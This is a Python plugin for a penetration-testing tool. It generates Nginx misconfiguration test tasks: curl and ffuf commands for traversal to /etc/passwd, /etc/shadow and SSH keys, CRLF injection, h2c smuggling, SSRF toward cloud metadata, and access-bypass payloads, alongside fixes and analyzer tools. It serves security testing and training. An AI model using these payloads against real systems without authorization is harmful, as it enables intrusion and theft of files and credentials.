"""
Nginx web server misconfiguration testing plugin

Generates tasks for Nginx-specific security testing including:
- Configuration file disclosure (missing root location)
- Alias path traversal (off-by-slash vulnerability)
- proxy_pass SSRF and header smuggling
- Variable injection ($uri, $document_uri misuse)
- merge_slashes bypass for LFI
- try_files misconfiguration testing
- X-Accel-* header injection
- Map directive authorization bypass
- h2c smuggling via Upgrade headers

Extracted from HackTricks: pentesting-web/nginx.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class NginxPlugin(ServicePlugin):
    """Nginx web server security testing plugin"""

    @property
    def name(self) -> str:
        return "nginx"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['nginx', 'http', 'https']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Nginx web servers"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()

        # Check for nginx in product/version
        if 'nginx' in product or 'nginx' in version:
            return True

        # Check if it's a web service (will require manual confirmation)
        if any(svc in service for svc in ['http', 'https', 'ssl/http']):
            # Only auto-trigger if product explicitly mentions nginx
            # Otherwise, user should manually run nginx-specific tests
            return 'nginx' in product.lower() if product else False

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Nginx security testing task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'Nginx')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'nginx-security-{port}',
            'name': f'Nginx Security Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Nginx Version Detection & Fingerprinting
        tasks['children'].append({
            'id': f'nginx-fingerprint-{port}',
            'name': 'Nginx Version Detection',
            'type': 'command',
            'metadata': {
                'command': f'curl -I {url}',
                'description': 'Identify Nginx version from Server header',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-I': 'Fetch HTTP headers only (HEAD request)',
                    url: 'Target URL'
                },
                'success_indicators': [
                    'Server: nginx/X.X.X header visible',
                    'Version number disclosed'
                ],
                'failure_indicators': [
                    'Server header stripped/hidden',
                    'Connection refused',
                    'Generic "Server: nginx" without version'
                ],
                'next_steps': [
                    'Search version for CVEs: searchsploit nginx X.X.X',
                    'Test for version-specific exploits',
                    'Check if version is outdated/vulnerable'
                ],
                'alternatives': [
                    f'nmap -sV -p{port} {target} --script http-server-header',
                    f'whatweb {url} -v',
                    f'Browser: Open DevTools Network tab and check Response headers'
                ],
                'notes': 'Many Nginx servers hide version for security (server_tokens off). If hidden, test common vulnerabilities blind.'
            }
        })

        # TASK 2: Missing Root Location - Config File Disclosure
        tasks['children'].append({
            'id': f'nginx-config-disclosure-{port}',
            'name': 'Test Missing Root Location (Config Disclosure)',
            'type': 'parent',
            'children': [
                {
                    'id': f'nginx-conf-test-{port}',
                    'name': 'Attempt nginx.conf Retrieval',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl {url}/nginx.conf',
                        'description': 'Test if root directive exposes /etc/nginx when no location / {} defined',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'curl': 'HTTP client to fetch URL',
                            f'{url}/nginx.conf': 'Default Nginx config path'
                        },
                        'success_indicators': [
                            'HTTP 200 OK response',
                            'File content shows Nginx configuration syntax',
                            'server { } blocks visible'
                        ],
                        'failure_indicators': [
                            'HTTP 404 Not Found (expected/secure)',
                            'HTTP 403 Forbidden (misconfigured but protected)',
                            'HTTP 301 redirect'
                        ],
                        'next_steps': [
                            'If successful: Review config for credentials, proxy_pass endpoints, internal IPs',
                            'Try /etc/nginx/sites-enabled/default',
                            'Try /etc/nginx/conf.d/default.conf',
                            'Look for include directives to find additional configs'
                        ],
                        'alternatives': [
                            f'wget {url}/nginx.conf -O nginx.conf',
                            f'Browser: Navigate to {url}/nginx.conf',
                            f'ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200'
                        ],
                        'notes': 'Vulnerability occurs when: root /etc/nginx; but no location / {} defined. Server serves files from /etc/nginx directly.'
                    }
                },
                {
                    'id': f'nginx-sites-enabled-{port}',
                    'name': 'Test sites-enabled/sites-available',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl {url}/sites-enabled/default',
                        'description': 'Attempt to retrieve site-specific configs',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'success_indicators': ['Config file content returned'],
                        'alternatives': [
                            f'curl {url}/sites-available/default',
                            f'curl {url}/conf.d/default.conf'
                        ]
                    }
                },
                {
                    'id': f'nginx-access-log-{port}',
                    'name': 'Test Access Log Exposure',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl {url}/access.log',
                        'description': 'Check if access logs exposed (could contain sensitive URLs, credentials)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'success_indicators': [
                            'Log entries visible',
                            'IP addresses, URLs, user agents logged'
                        ],
                        'next_steps': [
                            'Search logs for credentials in URLs',
                            'Identify other users/endpoints from logs',
                            'Look for admin panel paths in logs'
                        ],
                        'alternatives': [
                            f'curl {url}/error.log',
                            f'curl {url}/logs/access.log',
                            f'curl {url}/var/log/nginx/access.log'
                        ]
                    }
                }
            ]
        })

        # TASK 3: Alias Off-by-Slash Path Traversal
        tasks['children'].append({
            'id': f'nginx-alias-traversal-{port}',
            'name': 'Alias Off-by-Slash Path Traversal',
            'type': 'parent',
            'children': [
                {
                    'id': f'alias-traversal-test-{port}',
                    'name': 'Test Alias Misconfiguration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for alias directive missing trailing slash (LFI vulnerability)',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Vulnerability: location /imgs { alias /path/images/; }
Payload: /imgs../flag.txt resolves to /path/images/../flag.txt

Test Payloads (from Acunetix):
- /imgs../ → Expect 403 (vulnerable if not 404)
- /imgs.../ → Expect 404 (not vulnerable)
- /imgs../../ → Expect 403 (vulnerable)
- /imgs../../../../../../../../../../../etc/passwd → Expect 400/200

Fix: Add trailing slash to location: location /imgs/ { alias /path/images/; }

Find vulnerable endpoints by:
1. Identify all /path endpoints via gobuster
2. Test each with ../ appended
3. Look for 403 (directory exists) vs 404 (secure)
''',
                        'alternatives': [
                            'Manual fuzzing with Burp Repeater',
                            'Use nginxpwner tool (GitHub: stark0de/nginxpwner)',
                            'Use Gixy static analyzer (GitHub: yandex/gixy)'
                        ],
                        'success_indicators': [
                            'HTTP 403 on /path../ (proves directory traversal worked)',
                            'HTTP 200 with file contents',
                            'Different response for /path../ vs /path.../'
                        ],
                        'next_steps': [
                            'Map all traversable paths',
                            'Retrieve /etc/passwd, config files, SSH keys',
                            'Check for writable directories to upload webshell'
                        ]
                    }
                },
                {
                    'id': f'alias-automated-scan-{port}',
                    'name': 'Automated Alias Fuzzing',
                    'type': 'command',
                    'metadata': {
                        'command': f'ffuf -u {url}/FUZZ../ -w /usr/share/wordlists/dirb/common.txt -mc 403,200 -fc 404',
                        'description': 'Fuzz for alias misconfiguration endpoints',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-u': 'Target URL with FUZZ keyword',
                            'FUZZ../': 'Test pattern for off-by-slash',
                            '-w': 'Wordlist for endpoint names',
                            '-mc 403,200': 'Match HTTP 403/200 (vulnerable responses)',
                            '-fc 404': 'Filter out 404 (secure/non-existent)'
                        },
                        'success_indicators': [
                            'Endpoints returning 403 or 200 with ../ appended',
                            'Different status codes for /path vs /path../'
                        ],
                        'alternatives': [
                            f'wfuzz -u {url}/FUZZ../ -w /usr/share/wordlists/dirb/common.txt --hc 404',
                            'Manual: Test each gobuster-found directory with ../ suffix'
                        ]
                    }
                }
            ]
        })

        # TASK 4: proxy_pass SSRF and Header Smuggling
        tasks['children'].append({
            'id': f'nginx-proxy-pass-{port}',
            'name': 'proxy_pass SSRF & Header Smuggling',
            'type': 'parent',
            'children': [
                {
                    'id': f'h2c-smuggling-test-{port}',
                    'name': 'Test h2c Smuggling (Upgrade Header)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if proxy_set_header Upgrade/Connection allows h2c smuggling to backend',
                        'tags': ['OSCP:HIGH', 'ADVANCED'],
                        'notes': '''h2c Smuggling Vulnerability:

Vulnerable Config:
location / {
    proxy_pass http://backend:9999;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;      ← VULNERABLE
    proxy_set_header Connection $http_connection; ← VULNERABLE
}

location /flag {
    deny all;  ← Can be bypassed!
}

Attack: Establish direct HTTP/2 Cleartext connection to backend, bypassing Nginx routing.
Even if proxy_pass points to /socket.io, connection is to backend root (can access /flag).

Detection:
1. Send request with Upgrade: h2c and Connection: Upgrade headers
2. If server responds with 101 Switching Protocols, vulnerable
3. Use h2csmuggler tool: https://github.com/BishopFox/h2csmuggler

Exploitation:
python3 h2csmuggler.py -x {url} --scan-list /usr/share/wordlists/dirb/common.txt
python3 h2csmuggler.py -x {url} --request "GET /flag HTTP/1.1\\r\\nHost: {target}\\r\\n\\r\\n"
''',
                        'success_indicators': [
                            'HTTP 101 Switching Protocols response',
                            'Access to /flag or other denied paths',
                            'Direct backend responses bypass Nginx rules'
                        ],
                        'failure_indicators': [
                            'HTTP 400 Bad Request (secure)',
                            'Connection closed without upgrade',
                            'Nginx error page instead of backend response'
                        ],
                        'next_steps': [
                            'Map all backend endpoints via smuggling',
                            'Access internal APIs, admin panels',
                            'Exfiltrate data from protected paths'
                        ],
                        'alternatives': [
                            'Manual Burp Suite request with Upgrade: h2c',
                            'curl with --http2-prior-knowledge flag',
                            'Use nghttp2-client: nghttp -v {url}'
                        ]
                    }
                },
                {
                    'id': f'proxy-pass-ssrf-{port}',
                    'name': 'Test proxy_pass SSRF',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if proxy_pass allows SSRF via Host header manipulation',
                        'tags': ['OSCP:MEDIUM'],
                        'notes': '''If proxy_pass uses variables like $host or $http_host:

Vulnerable:
location / {
    proxy_pass http://$host/path;  ← Can set Host: attacker.com
}

Test:
1. Send: GET / HTTP/1.1\\nHost: 127.0.0.1:8080
2. Send: GET / HTTP/1.1\\nHost: 169.254.169.254 (AWS metadata)
3. Check if backend makes request to your controlled host

Use Burp Collaborator or webhook.site to detect outbound requests.
''',
                        'alternatives': [
                            'Burp Collaborator interaction test',
                            'Setup netcat listener: nc -lvnp 8080'
                        ]
                    }
                }
            ]
        })

        # TASK 5: Unsafe Variable Use ($uri CRLF Injection)
        tasks['children'].append({
            'id': f'nginx-uri-injection-{port}',
            'name': 'Unsafe Variable Injection (CRLF)',
            'type': 'parent',
            'children': [
                {
                    'id': f'crlf-injection-test-{port}',
                    'name': 'Test $uri CRLF Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i "{url}/%0d%0aDetectify:%20clrf"',
                        'description': 'Test if $uri variable allows CRLF injection for HTTP response splitting',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-i': 'Include HTTP response headers in output',
                            '%0d%0a': 'URL-encoded CRLF (\\r\\n)',
                            'Detectify:%20clrf': 'Test header injection'
                        },
                        'success_indicators': [
                            'Injected header appears in response: Detectify: clrf',
                            'HTTP response contains custom headers',
                            'Response splitting achieved'
                        ],
                        'failure_indicators': [
                            'URL-encoded characters remain encoded in response',
                            'HTTP 400 Bad Request',
                            'No custom header in response'
                        ],
                        'next_steps': [
                            'Inject Set-Cookie headers for session fixation',
                            'Inject malicious JavaScript in custom headers',
                            'Chain with XSS for account takeover',
                            'Test other endpoints for same vulnerability'
                        ],
                        'alternatives': [
                            f'curl "{url}/%20HTTP/1.1%0D%0AXXXX:%20x" (test HTTP method injection)',
                            f'Burp Repeater with manual CRLF payloads',
                            f'Browser: {url}/%0d%0aX-Injected:%20value (check DevTools)'
                        ],
                        'notes': '''Vulnerable patterns:
- location / { return 302 https://example.com$uri; }
- location / { proxy_pass http://backend$uri; }
- rewrite rules using $uri

Fix: Use $request_uri instead of $uri (doesn't decode)
Or: Use regex with \\s check: location ~ /docs/([^/\\s])? { }
'''
                    }
                },
                {
                    'id': f'http-method-detection-{port}',
                    'name': 'HTTP Method Injection Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i "{url}/%20X"',
                        'description': 'Detect CRLF injection via HTTP method manipulation',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '%20X': 'Space + invalid HTTP method (should trigger 400 if vulnerable)'
                        },
                        'success_indicators': [
                            'Any HTTP code (first request with %20X)',
                            'Then HTTP 400 Bad Request with %20H (proves injection)'
                        ],
                        'next_steps': [
                            'If detected: Exploit with full CRLF injection',
                            'Test: {url}/%20HTTP/1.1%0D%0AHost:%20attacker.com'
                        ],
                        'alternatives': [
                            f'curl "{url}/%20H" (should give 400 if vulnerable)',
                            f'Compare: curl "{url}/%20HTTP/1.1%0D%0AXXXX:%20x" vs curl "{url}/%20HTTP/1.1%0D%0AHost:%20x"'
                        ]
                    }
                }
            ]
        })

        # TASK 6: try_files with $uri$args LFI
        tasks['children'].append({
            'id': f'nginx-try-files-lfi-{port}',
            'name': 'try_files $uri$args LFI',
            'type': 'command',
            'metadata': {
                'command': f'curl "{url}/?../../../../../../../../etc/passwd"',
                'description': 'Test for LFI via try_files $uri$args misconfiguration',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    '?../../../etc/passwd': 'Query string path traversal (combined with $uri$args)'
                },
                'success_indicators': [
                    '/etc/passwd contents returned',
                    'HTTP 200 with file contents',
                    'root:x:0:0 visible in response'
                ],
                'failure_indicators': [
                    'HTTP 404 Not Found (secure)',
                    'HTTP 400 Bad Request',
                    'Query string not processed as path'
                ],
                'next_steps': [
                    'Retrieve SSH keys: /?../../../root/.ssh/id_rsa',
                    'Retrieve config files: /?../../../etc/nginx/nginx.conf',
                    'Test for writable paths to upload webshell',
                    'Check if Nginx runs as root (can read all files)'
                ],
                'alternatives': [
                    f'curl "{url}/?../../../../../../etc/shadow"',
                    f'Burp Intruder with depth fuzzing: /?{{../}}etc/passwd',
                    f'Manual browser test: {url}/?../../../../etc/passwd'
                ],
                'notes': '''Vulnerable Config:
location / {
    try_files $uri$args $uri$args/ /index.html;  ← VULNERABLE
}

Nginx tries: /var/www/html/public/?../../../../etc/passwd
Resolves to: /etc/passwd

Fix: Don't use $args in try_files, use $uri only:
try_files $uri $uri/ /index.html;
'''
            }
        })

        # TASK 7: merge_slashes Off Bypass
        tasks['children'].append({
            'id': f'nginx-merge-slashes-{port}',
            'name': 'merge_slashes Off Detection',
            'type': 'command',
            'metadata': {
                'command': f'curl "{url}//admin" -v',
                'description': 'Test if merge_slashes is off (allows double-slash bypass)',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                'flag_explanations': {
                    '//admin': 'Double slash (merged to /admin if merge_slashes on)',
                    '-v': 'Verbose output to see redirect behavior'
                },
                'success_indicators': [
                    'Different response for //admin vs /admin',
                    'Access to restricted paths via //path',
                    'Backend sees //path while Nginx rules match /path'
                ],
                'failure_indicators': [
                    'Same response for //admin and /admin (merge_slashes on)',
                    'HTTP 404 for both'
                ],
                'next_steps': [
                    'Test all restricted paths with double slashes',
                    'Try: //admin, //backup, //api, //internal',
                    'Chain with backend path normalization differences'
                ],
                'alternatives': [
                    f'curl "{url}/////admin" (multiple slashes)',
                    f'Test with Burp: /admin vs //admin vs ///admin',
                    'Check response for any difference in behavior'
                ],
                'notes': '''merge_slashes on (default): //path → /path (secure)
merge_slashes off: //path sent as-is to backend (bypass potential)

Applications behind Nginx may have LFI vulns hidden by default merge_slashes.
If off: Test for LFI, auth bypass, path traversal on backend.

Reference: https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
'''
            }
        })

        # TASK 8: X-Accel-* Header Injection
        tasks['children'].append({
            'id': f'nginx-x-accel-{port}',
            'name': 'X-Accel-Redirect Header Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Test if backend responses with X-Accel-Redirect cause Nginx path traversal',
                'tags': ['OSCP:HIGH', 'ADVANCED'],
                'notes': '''X-Accel-* Headers (Nginx-specific):
- X-Accel-Redirect: Internal redirect to specified path
- X-Accel-Buffering: Control response buffering
- X-Accel-Charset: Set charset for redirected response
- X-Accel-Expires: Set expiration time
- X-Accel-Limit-Rate: Rate limiting

Exploitation:
If backend vulnerable to header injection and Nginx has "root /":

1. Inject response header: X-Accel-Redirect: .env
2. Nginx performs internal redirect to /.env
3. Nginx sends /.env contents to client

Attack Vectors:
- CRLF injection in backend app
- Header manipulation in proxied apps
- Reflected headers in responses

Test:
1. Find header injection point in backend
2. Inject: X-Accel-Redirect: /etc/passwd
3. Check if Nginx serves /etc/passwd

Requires:
- Backend header injection vuln
- Nginx with broad root directive

Reference: https://mizu.re/post/cors-playground
''',
                'success_indicators': [
                    'Injected X-Accel-Redirect causes file disclosure',
                    'Nginx serves arbitrary files from filesystem',
                    'Internal paths accessible via header manipulation'
                ],
                'alternatives': [
                    'Test with Burp Repeater adding X-Accel-Redirect header',
                    'Check if app reflects headers or allows CRLF injection',
                    'Review backend code for header setting logic'
                ]
            }
        })

        # TASK 9: Map Directive Authorization Bypass
        tasks['children'].append({
            'id': f'nginx-map-bypass-{port}',
            'name': 'Map Directive Authorization Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Test for missing default value in map directive (authz bypass)',
                'tags': ['OSCP:MEDIUM'],
                'notes': '''Vulnerable Pattern:
map $uri $mappocallow {
    /map-poc/private 0;  ← Denied
    /map-poc/secret 0;   ← Denied
    /map-poc/public 1;   ← Allowed
    # No default! If $uri doesn't match, $mappocallow is empty/null
}

location /map-poc {
    if ($mappocallow = 0) {return 403;}  ← Only blocks if explicitly 0
    # If $mappocallow is empty, this check passes!
    return 200 "Private area";
}

Bypass:
Access /map-poc/ANYTHING (not in map) → $mappocallow is empty → passes if check → 200 OK

Test:
1. Identify /map-poc or similar protected paths
2. Try: /map-poc/randompath, /map-poc/test, /map-poc/x
3. If accessible, map has no default value

Fix: Add default in map:
map $uri $mappocallow {
    default 0;  ← Default deny
    /map-poc/public 1;
}

Detection:
- Fuzz protected directory with random paths
- Compare responses for defined vs undefined URIs
''',
                'success_indicators': [
                    'Access to undefined paths in protected directory',
                    'Different behavior for /path/defined vs /path/random'
                ],
                'alternatives': [
                    'Burp Intruder fuzzing protected paths',
                    f'ffuf -u {url}/protected/FUZZ -w wordlist.txt',
                    'Manual testing with curl for each undefined path'
                ]
            }
        })

        # TASK 10: Unsafe Path Restriction Bypass
        tasks['children'].append({
            'id': f'nginx-path-restriction-{port}',
            'name': 'Path Restriction Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Test for bypass of location = /admin restrictions',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                'notes': '''Vulnerable Config:
location = /admin {
    deny all;
}
location = /admin/ {
    deny all;
}

Bypasses:
- /admin../ (double dot)
- /admin%2f (URL-encoded slash)
- /admin%20 (trailing space)
- /admin%09 (tab character)
- /admin%0a (newline)
- /admin;/ (semicolon)
- /admin?.anything (query string)

The "=" modifier means exact match, but URL encoding/normalization can bypass.

Test Payloads:
curl {url}/admin
curl {url}/admin/
curl {url}/admin../
curl {url}/admin%2f
curl {url}/admin%20
curl {url}/admin;/
curl {url}/admin?.
curl {url}/admin%09
curl {url}/ADMIN (case sensitivity on some backends)

Reference: HackTricks - proxy-waf-protections-bypass.md
''',
                'success_indicators': [
                    'Access to /admin via bypass payload',
                    'Different response vs direct /admin access'
                ],
                'alternatives': [
                    'Burp Intruder with bypass payload list',
                    'Manual curl testing each payload',
                    'Use bypass-url-parser tool'
                ]
            }
        })

        # TASK 11: Raw Backend Response Reading
        tasks['children'].append({
            'id': f'nginx-raw-backend-{port}',
            'name': 'Raw Backend Response Reading',
            'type': 'manual',
            'metadata': {
                'description': 'Test if invalid HTTP requests expose raw backend responses',
                'tags': ['OSCP:LOW', 'ADVANCED'],
                'notes': '''Nginx Feature:
- proxy_intercept_errors on: Nginx serves custom error pages for backend errors
- proxy_hide_header Secret-Header: Hides specific headers from clients

Bypass:
Send invalid HTTP request → Nginx forwards as-is → Backend returns error with headers → Nginx doesn't intercept (invalid request) → Client sees raw backend response

Test:
echo -e "GET / HTTP/1.1\\r\\nInvalid: \\x00\\r\\n\\r\\n" | nc {target} {port}

Or malformed request:
curl -X "INVALID\\x00METHOD" {url}

If successful:
- See backend error messages (stack traces, versions)
- See hidden headers (X-Powered-By, Secret-Header, etc.)
- Backend framework details exposed

Requires:
- Backend app (uWSGI, Gunicorn, etc.)
- Nginx with proxy_intercept_errors
- Crafted invalid HTTP request
''',
                'success_indicators': [
                    'Backend headers visible (X-Powered-By, Server, etc.)',
                    'Stack traces or debug info in response',
                    'Different response vs valid HTTP request'
                ],
                'alternatives': [
                    'Use netcat for raw TCP: nc {target} {port}',
                    'Burp Repeater with malformed HTTP',
                    'Python socket for custom requests'
                ]
            }
        })

        # TASK 12: Static Analysis Tools
        tasks['children'].append({
            'id': f'nginx-static-analysis-{port}',
            'name': 'Static Analysis & Tools',
            'type': 'parent',
            'children': [
                {
                    'id': f'gixy-scan-{port}',
                    'name': 'Gixy Configuration Analyzer',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Run Gixy static analyzer on Nginx config (if obtained)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'notes': '''Gixy: https://github.com/yandex/gixy

Install:
pip3 install gixy

Usage:
gixy /etc/nginx/nginx.conf
gixy /path/to/nginx.conf

Detects:
- SSRF via variable use in proxy_pass
- Path traversal in alias
- add_header inheritance issues
- Host header injection
- Many other common misconfigs

Requires:
- Nginx config file (obtain via LFI, missing root, misconfiguration)
''',
                        'alternatives': [
                            'Manual config review using HackTricks checklist',
                            'nginxpwner for remote testing'
                        ]
                    }
                },
                {
                    'id': f'nginxpwner-scan-{port}',
                    'name': 'Nginxpwner Remote Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'nginxpwner {url}',
                        'description': 'Automated Nginx misconfiguration scanner (remote)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'nginxpwner': 'Nginx vulnerability scanner',
                            url: 'Target URL to test'
                        },
                        'notes': '''Nginxpwner: https://github.com/stark0de/nginxpwner

Install:
git clone https://github.com/stark0de/nginxpwner
cd nginxpwner
pip3 install -r requirements.txt

Tests:
- Alias traversal
- Variable injection
- merge_slashes detection
- Common misconfigurations

Alternative to manual testing when time-limited (OSCP exam scenario).
''',
                        'success_indicators': [
                            'Vulnerabilities detected and reported',
                            'Exploitable misconfigurations found'
                        ],
                        'alternatives': [
                            'Manual testing using HackTricks checklist',
                            'Nikto Nginx plugin tests'
                        ]
                    }
                },
                {
                    'id': f'nginx-docker-lab-{port}',
                    'name': 'Practice with Detectify Vulnerable Nginx Lab',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Setup vulnerable Nginx lab for practice',
                        'tags': ['OSCP:LOW', 'EDUCATIONAL'],
                        'notes': '''Detectify Vulnerable Nginx: https://github.com/detectify/vulnerable-nginx

Setup:
git clone https://github.com/detectify/vulnerable-nginx
cd vulnerable-nginx
docker-compose up

Contains real vulnerable configs for:
- Missing root location
- Alias traversal
- Variable injection
- merge_slashes issues

Perfect for OSCP lab practice before exam.
'''
                    }
                }
            ]
        })

        # TASK 13: Version-Specific Exploit Research
        if version and version != 'unknown':
            tasks['children'].append({
                'id': f'nginx-exploit-research-{port}',
                'name': f'Exploit Research: Nginx {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-nginx-{port}',
                        'name': f'SearchSploit: Nginx {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit nginx {version}',
                            'description': 'Search ExploitDB for known Nginx vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'Offline ExploitDB search',
                                f'nginx {version}': 'Search term'
                            },
                            'success_indicators': [
                                'Exploits found for this version',
                                'CVE references in results'
                            ],
                            'next_steps': [
                                'Read exploit code: searchsploit -x <exploit-id>',
                                'Copy exploit: searchsploit -m <exploit-id>',
                                'Test exploit against target',
                                'Look up CVE for details and patches'
                            ],
                            'alternatives': [
                                'Google: nginx {version} exploit',
                                'Check https://www.cvedetails.com/vulnerability-list/vendor_id-10048/Nginx.html',
                                'GitHub: search for "{version} exploit"'
                            ]
                        }
                    },
                    {
                        'id': f'cve-lookup-nginx-{port}',
                        'name': f'CVE Lookup: Nginx {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'crack cve-lookup nginx {version}',
                            'description': 'Search CVE databases for Nginx vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': [
                                'CVE entries found for version',
                                'Vulnerability descriptions and severity ratings'
                            ],
                            'next_steps': [
                                'Read CVE details for exploitability',
                                'Check for public PoC exploits',
                                'Verify if target is vulnerable via manual testing'
                            ],
                            'alternatives': [
                                'Visit https://nvd.nist.gov/vuln/search',
                                'Visit https://www.cvedetails.com',
                                f'searchsploit nginx {version}',
                                f'Google: nginx {version} CVE'
                            ]
                        }
                    }
                ]
            })

        return tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for Nginx testing"""
        alternatives = {
            'fingerprint': [
                'curl -I <URL> | grep Server',
                'Browser: DevTools → Network → Headers → Server',
                'nmap -sV -p<port> <target>'
            ],
            'config-disclosure': [
                'Manual: curl <URL>/nginx.conf',
                'Try: /etc/nginx/nginx.conf, /etc/nginx/sites-enabled/default',
                'Browser: Navigate to <URL>/nginx.conf'
            ],
            'alias-traversal': [
                'Manual: curl <URL>/path../',
                'Burp Repeater: Fuzz with ../ appended to paths',
                'Browser: Try <URL>/images../../../etc/passwd'
            ],
            'crlf-injection': [
                'curl "<URL>/%0d%0aInjected:%20value"',
                'Burp Repeater: Insert CRLF in URL',
                'Browser: <URL>/%0d%0aX-Test:%20value'
            ],
            'try-files-lfi': [
                'curl "<URL>/?../../../../etc/passwd"',
                'Browser: <URL>/?../../../../etc/passwd',
                'Burp Intruder: Fuzz traversal depth'
            ]
        }

        for key, cmds in alternatives.items():
            if key in task_id:
                return cmds

        return []
